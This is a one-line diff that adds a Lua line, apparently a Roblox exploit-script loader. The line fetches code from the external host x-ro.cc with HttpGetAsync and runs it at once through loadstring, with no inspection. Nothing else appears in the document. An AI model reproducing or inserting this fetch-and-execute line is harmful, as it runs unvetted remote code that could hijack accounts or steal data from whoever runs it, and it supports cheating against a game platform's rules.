@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync'https://x-ro.cc/modules/loadstring.lua')''
